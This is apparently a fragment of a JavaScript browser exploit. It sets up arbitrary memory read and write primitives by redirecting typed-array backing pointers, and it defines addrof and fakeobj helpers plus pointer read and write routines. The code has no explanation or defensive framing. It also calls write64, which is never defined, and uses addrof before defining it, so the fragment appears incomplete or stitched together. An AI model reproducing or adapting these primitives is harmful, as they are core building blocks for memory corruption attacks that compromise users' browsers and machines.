var oob_master = new Uint32Array(1024);
var oob_slave = new Uint8Array(1024);
var leaker_arr = new Uint32Array(1024);
var leaker_obj = {a: 1234};
write64(addrof(oob_master).add(16), addrof(oob_slave));
write64(addrof(leaker_arr).add(16), addrof(leaker_obj));

var i48_put = function(x, a)
{
    a[4] = x | 0;
    a[5] = (x / 4294967296) | 0;
}

var i48_get = function(a)
{
    return a[4] + a[5] * 4294967296;
}

var addrof = function(x)
{
    leaker_obj.a = x;
    return i48_get(leaker_arr);
}

var fakeobj = function(x)
{
    i48_put(x, leaker_arr);
    return leaker_obj.a;
}

var read_mem_setup = function(p, sz)
{
    i48_put(p, oob_master);
    oob_master[6] = sz;
}

var read_mem = function(p, sz)
{
    read_mem_setup(p, sz);
    var arr = [];
    for(var i = 0; i < sz; i++)
        arr.push(oob_slave[i]);
    return arr;
}

var read_mem_s = function(p, sz)
{
    read_mem_setup(p, sz);
    return ""+oob_slave;
}

var read_mem_b = function(p, sz)
{
    read_mem_setup(p, sz);
    var b = new Uint8Array(sz);
    b.set(oob_slave);
    return b;
}

var read_mem_as_string = function(p, sz)
{
    var x = read_mem_b(p, sz);
    var ans = '';
    for(var i = 0; i < x.length; i++)
        ans += String.fromCharCode(x[i]);
    return ans;
}

var write_mem = function(p, data)
{
    i48_put(p, oob_master);
    oob_master[6] = data.length;
    for(var i = 0; i < data.length; i++)
        oob_slave[i] = data[i];
}

var read_ptr_at = function(p)
{
    var ans = 0;
    var d = read_mem(p, 8);
    for(var i = 7; i >= 0; i--)
        ans = 256 * ans + d[i];
    return ans;
}

var write_ptr_at = function(p, d)
{
    var arr = [];
    for(var i = 0; i < 8; i++)
    {
        arr.push(d & 0xff);
        d /= 256;
    }
    write_mem(p, arr);
}

var hex = function(x)
{
    return (new Number(x)).toString(16);
}
